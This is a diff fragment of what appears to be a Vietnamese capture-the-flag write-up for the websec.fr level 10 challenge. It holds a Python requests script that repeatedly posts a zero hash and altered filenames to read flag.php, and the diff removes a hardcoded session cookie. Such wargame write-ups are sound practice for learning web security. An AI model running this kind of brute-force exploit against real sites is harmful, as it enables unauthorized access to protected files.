@@ -41,13 +41,12 @@ Mình sẽ viết script để exploit bằng python
 import requests
 
 burp0_url = "https://websec.fr:443/level10/index.php"
-burp0_cookies = {"PHPSESSID": "591crqib06blpuu9e5o4kvvae9e4vrqd", "session": "eyJjc3JmIjp7IiBiIjoiY0hKMFV6ZFVTWFl4V2k5cWFXaDZkRUpVVDBaWk5TOXVhaXQ1VkVKMWR6WlZVVEI0U1RJMGNtVjJaMUU1YVc0d2FqSmFZV2swVlRWaGVYTktSa05NWm5vNUsyWkdiWGR0YlVSQmMzRmphbmxaVTFNM1NrRTlQUT09In0sImxvZ2luIjoiZ29kZG9nIn0.FihOrQ.kNvf2Pbye6xIq98vu_0WY2IkBV8"}
 burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://websec.fr", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://websec.fr/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
 filename = "flag.php"
 i = 1
 while True:
      burp0_data = {"f":filename, "hash": "0"}
-     r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+     r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
      if "Permission denied!" not in r.text:
           print(r.text)
           break
